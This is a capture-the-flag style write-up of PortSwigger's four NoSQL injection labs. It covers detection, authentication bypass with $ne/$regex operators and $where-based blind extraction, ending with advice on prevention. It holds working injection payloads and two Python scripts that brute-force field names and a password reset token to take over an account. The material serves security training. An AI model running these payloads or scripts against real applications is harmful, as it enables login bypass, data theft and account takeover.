# NoSQL Injection

> PortSwigger Web Security Academy · **4/4** labs completed

NoSQL injection abuses query operators and JavaScript execution in databases such as MongoDB to bypass authentication or extract data.

[← Back to the index](README.md)

## Contents

- [How to approach this vulnerability](#how-to-approach-this-vulnerability)
- [1. Detecting NoSQL injection](#1-detecting-nosql-injection)
- [2. Exploiting NoSQL operator injection to bypass authentication](#2-exploiting-nosql-operator-injection-to-bypass-authentication)
- [3. Exploiting NoSQL injection to extract data](#3-exploiting-nosql-injection-to-extract-data)
- [4. Exploiting NoSQL operator injection to extract unknown fields](#4-exploiting-nosql-operator-injection-to-extract-unknown-fields)
- [Prevention](#prevention)

## How to approach this vulnerability

Checklist of things to check when you suspect this class of bug, covering the different ways it shows up:

- Identify fields likely checked against a NoSQL/document store (login, search, filters) and test sending an object instead of a string, e.g. `password[$ne]=1` or `{"password":{"$ne":""}}`.
- Test operator injection for auth bypass: `$ne`, `$gt`, `$regex`, `$exists` in place of exact-match fields.
- Test for server-side JavaScript execution if the backend supports it (e.g. MongoDB `$where`), which can allow blind extraction of unknown field names/values character by character.
- If a field name is unknown (e.g. a reset token), use a regex-based blind extraction technique, iterating over field names and then characters.
- Check whether input is validated by type (string vs object/array) anywhere before it reaches the query — type confusion is the root cause in most of these bugs.
- Check JSON body parameters as well as URL/form parameters — the vulnerable field is often only reachable via a JSON request body.

## Lab write-ups

### 1. Detecting NoSQL injection

**Lab:** [Detecting NoSQL injection](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)

- This lab has the vuln in filter section
- First click on any category filter and send the request to the repeater
- Modify the query parameter and add `'` at the end of the query parameter- eg -`accessories'`
- Note that it throws an error that there is a syntax error, so the site is not validating or sanitizing the input and it is just adding whatever input is given there
- Now add any false operators to check whether we are able to control that endpoint. it could be done by adding AND operator. for AND operator, if any one is false then the entire equation becomes false, so our goal is to see no products when we send the below payload - `accessories' && 0 && 'x`. make sure to url encode it -  `Accessories'+%26%26+0+%26%26+'x`
- This shows no products which shows that we are able to manipulate the input
- Now add a OR operator payload where OR operators becomes true if any one is true
- So the payload is `Accessories'+%26%26+1+%26%26+'x`
- Now we are able to retrieve every product
- Now add a condition where the query is always true for every condition and this can be achieved by using `||1||'`
- So the payload is `Accessories'||1||'`
- The payload tells that if 1 is true then retrieve everything and this results in showing unreleased products too

---

### 2. Exploiting NoSQL operator injection to bypass authentication

**Lab:** [Exploiting NoSQL operator injection to bypass authentication](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication)

- In this lab the vuln exists in the login page. we will eventually be able to login as admin and there is a auth bypass vuln here
- To test it first login as wiener
- Then send the request to the repeater and change the username from wiener to `{"$ne":''}` and keep the password the same. this tells that any account with the username whose value is not a empty string and the password is peter. this should satisfy both the condition and see that we are able to login as wiener again, and in this case wiener is the only person whose is having the password peter.
- Now change the $ne to something is regex which is like we will be giving the first 2 characters of wiener and then tells any character after this is ok. for example in this case we will be giving it like

```
{"$regex":"wien.*"}
```

- This means that the starting charters should be wien and after that any char is fine so now also we are able to login as wiener subject to he is the only one who is having the username which starts with `wien`
- Now change both the username and password to $ne now we can see that we get an error telling that one or more entries available and not able to login
- So we are again going to use the regex method to crack the admin account with password not equal to empty string
- The payload will be

```
{
"username":{"$regex":"admin.*"},
"password":{"$ne":""}
}
```

- Now we logged in as admin and send this request to the browser

---

### 3. Exploiting NoSQL injection to extract data

**Lab:** [Exploiting NoSQL injection to extract data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)

- This lab has the vuln in exposing the data in user lookup endpoint
- When we login to the account there is a specific requests where it tells about the user details like username, user email, user role
- So first we will add a `'` at the end of the query parameter of username and we can see that it throws an error and this is a confirmation that the input is not getting sanitized
- Now we try to get the password of admin so that we can login into the account
- First we need to identify the password length and they have already told that the password is only lowercase letters
- We need to change the username to administrator and add this payload after that so that we can get the password length `' && this.password.length<1` and url encoded is `administrator'+%26%26+this.password.length<2`
- The above payload returns the details of the admin when both the conditions are true so for password check which is <2 returns error so confirms that password length is greater than 2
- Increment the count and you can see that the admin details will appear when the number becomes 9 and that tells that the length of the password is 8
- Now change the payload to `administrator'+%26%26+this.password[0]%3d%3d'a` so that this checks whether the first character of the password is a. we need to brute force for every character and every possible alphabet
- To do that we use cluster bomb attack in intruder
- Mark the index value and the character needs to be checked. in payload section add the number from 0 to 7 and for characters add a-z
- So we sort the response with the length and you will get the characters of the corresponding index positions
 - The password is `chvjsrqo`
- Now login to the account

---

### 4. Exploiting NoSQL operator injection to extract unknown fields

**Lab:** [Exploiting NoSQL operator injection to extract unknown fields](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)

- In this lab the vuln exists in extracting unknown field names
- First we need to submit a invalid password for carlos and send the request to the repeater
- Then we need to change the password to $ne:invalid and we can see that it returns account is locked reset the password, so the password accepts operator injection
- Now we will add $where:'0' after password field and see it throws an error and when we change it to '1' we can see that it gives the same error `account is locked, reset the password`
- This confirms that this site is taking $where class
- Now we need to find all the fields in this document so that we can get the reset token field name
- To do this add this regex expression in where field `"$where":"Object.keys(this)[1].match('^.{}.*')"` and send it to the intruder
- payload- `"$where":object.keys(this)[1].match('^.{§§}§§.*')`
- Mark the empty space in curly brackets and add a marker right after the curly brackets
- Add 0 to 20 for first marker and [a-z] [A-Z] [0-9] for second marker
- Run the scan and you will get the field names and one field is for reset token
- Now we found the rest token field which is **pwResetTkn**, take this field name and add this as query parameter in the reset-password endpoint with a random value and you will get an error like invalid token
- `/forgot-password?pwResetTkn=wfe` now we get invalid token
- Now we need to find the value for this field pwResetTkn. to do that have the same payload for cluster bomb attack but change the field name to `this.pwResetTkn.match('^.{§§}§§.*')`
- Now run with the same payloads for marker 1 and 2
- Now we got the value which is `dbec3aca9c995453`
- Now visit `/forgot-password?pwResetTkn=dbec3aca9c995453` to change the password of carlos's account and login to his account
- The python code for cluster bomb attack

```python
for finding the field name


import requests
import string
import sys

# ==================================================
# CONFIGURATION
# ==================================================

BASE_URL = "https://YOUR-LAB-ID.web-security-academy.net"
LOGIN_URL = BASE_URL + "/login"

CHARACTERS = string.ascii_lowercase + string.ascii_uppercase + string.digits

MAX_KEY_INDEX = 20
MAX_FIELD_LENGTH = 21

session = requests.Session()


# ==================================================
# SEND INJECTION
# ==================================================

def send_payload(key_index, position, character):

    regex = f"^.{{{position}}}{character}.*"

    payload = {
        "username": "carlos",
        "password": {
            "$ne": "invalid"
        },
        "$where": (
            f"Object.keys(this)[{key_index}]"
            f".match('{regex}')"
        )
    }

    response = session.post(
        LOGIN_URL,
        json=payload,
        timeout=15
    )

    response.raise_for_status()

    return response.text


# ==================================================
# CHECK TRUE / FALSE CONDITION
# ==================================================

def is_true(key_index, position, character):

    response = send_payload(
        key_index,
        position,
        character
    )

    return "Account locked" in response


# ==================================================
# EXTRACT FIELD NAME
# ==================================================

def extract_field(key_index):

    field_name = ""

    for position in range(MAX_FIELD_LENGTH):

        found = False

        for character in CHARACTERS:

            if is_true(key_index, position, character):

                field_name += character
                found = True

                print(
                    f"    Position {position}: {character}"
                )

                break

        if not found:
            break

    return field_name


# ==================================================
# MAIN
# ==================================================

def main():

    print("=" * 55)
    print("   NoSQL INJECTION - FIELD ENUMERATION")
    print("=" * 55)

    print("\n[*] Target:", LOGIN_URL)
    print("[*] Starting field enumeration...\n")

    discovered_fields = []

    for key_index in range(1, MAX_KEY_INDEX + 1):

        print(f"\n[*] Testing Object.keys(this)[{key_index}]")

        field_name = extract_field(key_index)

        if field_name:

            discovered_fields.append(field_name)

            print(f"\n[+] Field discovered: {field_name}")

        else:
            print("[-] No matching field found.")

    print("\n" + "=" * 55)
    print("         DISCOVERED JSON FIELDS")
    print("=" * 55)

    for field in discovered_fields:
        print("[+] ", field)

    print("\n[*] Enumeration completed.")


if __name__ == "__main__":

    try:
        main()

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted.")

    except requests.RequestException as error:
        print(f"\n[!] Request error: {error}")
```

```
output

  ┌──(goutham24㉿gouthaman)-[~]
└─$ python temp.py
=======================================================
   NoSQL INJECTION - FIELD ENUMERATION
=======================================================

[*] Target: https://YOUR-LAB-ID.web-security-academy.net/login
[*] Starting field enumeration...


[*] Testing Object.keys(this)[1]
    Position 0: u
    Position 1: s
    Position 2: e
    Position 3: r
    Position 4: n
    Position 5: a
    Position 6: m
    Position 7: e

[+] Field discovered: username

[*] Testing Object.keys(this)[2]
    Position 0: p
    Position 1: a
    Position 2: s
    Position 3: s
    Position 4: w
    Position 5: o
    Position 6: r
    Position 7: d

[+] Field discovered: password

[*] Testing Object.keys(this)[3]
    Position 0: e
    Position 1: m
    Position 2: a
    Position 3: i
    Position 4: l

[+] Field discovered: email

[*] Testing Object.keys(this)[4]
    Position 0: p
    Position 1: w
    Position 2: R
    Position 3: e
    Position 4: s
    Position 5: e
    Position 6: t
    Position 7: T
    Position 8: k
    Position 9: n

[+] Field discovered: pwResetTkn

[*] Testing Object.keys(this)[5]

[!] Request error: 500 Server Error: Internal Server Error for url: https://YOUR-LAB-ID.web-security-academy.net/login
```

```python
- ```
  for finding the value of password reset token


import requests
import string

# ==========================================
# CONFIGURATION
# ==========================================

BASE_URL = "https://YOUR-LAB-ID.web-security-academy.net"
LOGIN_URL = BASE_URL + "/login"

TOKEN_FIELD = "pwResetTkn"

CHARACTERS = string.ascii_lowercase + string.ascii_uppercase + string.digits

MAX_TOKEN_LENGTH = 100

session = requests.Session()


# ==========================================
# SEND INJECTION
# ==========================================

def send_payload(position, character):

    regex = f"^.{{{position}}}{character}.*"

    payload = {
        "username": "carlos",
        "password": {
            "$ne": "invalid"
        },
        "$where": f"this.{TOKEN_FIELD}.match('{regex}')"
    }

    response = session.post(
        LOGIN_URL,
        json=payload,
        timeout=15
    )

    response.raise_for_status()

    return response.text


# ==========================================
# CHECK CONDITION
# ==========================================

def is_true(position, character):

    response = send_payload(position, character)

    return "Account locked" in response


# ==========================================
# EXTRACT TOKEN
# ==========================================

def extract_token():

    token = ""

    print("[*] Extracting password reset token...\n")

    for position in range(MAX_TOKEN_LENGTH):

        found = False

        for character in CHARACTERS:

            if is_true(position, character):

                token += character
                found = True

                print(
                    f"[+] Position {position}: {character}"
                )

                break

        if not found:
            print("\n[*] No further characters found.")
            break

    return token


# ==========================================
# MAIN
# ==========================================

def main():

    print("=" * 50)
    print("   NoSQL RESET TOKEN EXTRACTION")
    print("=" * 50)

    token = extract_token()

    print("\n" + "=" * 50)
    print("[SUCCESS] TOKEN EXTRACTION COMPLETED")
    print("Reset token:", token)
    print("=" * 50)

    print("\nReset URL:")
    print(f"{BASE_URL}/forgot-password?pwResetTkn={token}")


if __name__ == "__main__":

    try:
        main()

    except KeyboardInterrupt:
        print("\n[!] Interrupted.")

    except requests.RequestException as error:
        print(f"\n[!] Request error: {error}")
```

```
output
  ==================================================
   NoSQL RESET TOKEN EXTRACTION
==================================================
[*] Extracting password reset token...

[+] Position 0: d
[+] Position 1: b
[+] Position 2: e
[+] Position 3: c
[+] Position 4: 3
[+] Position 5: a
[+] Position 6: c
[+] Position 7: a
[+] Position 8: 9
[+] Position 9: c
[+] Position 10: 9
[+] Position 11: 9
[+] Position 12: 5
[+] Position 13: 4
[+] Position 14: 5
[+] Position 15: 3

[*] No further characters found.

==================================================
[SUCCESS] TOKEN EXTRACTION COMPLETED
Reset token: dbec3aca9c995453
==================================================

Reset URL:
https://YOUR-LAB-ID.web-security-academy.net/forgot-password?pwResetTkn=dbec3aca9c995453
```

---

## Prevention

How this class of bug is fixed, based on what these labs showed:

- Validate the type of every input. Reject objects or arrays where a string is expected, so operators like `$ne` and `$gt` cannot be injected.
- Strip or reject keys that start with `$` coming from user input.
- Do not use `$where` or other server-side JavaScript execution with user-controlled data.
- Use schema validation in your ODM and least-privilege database users.
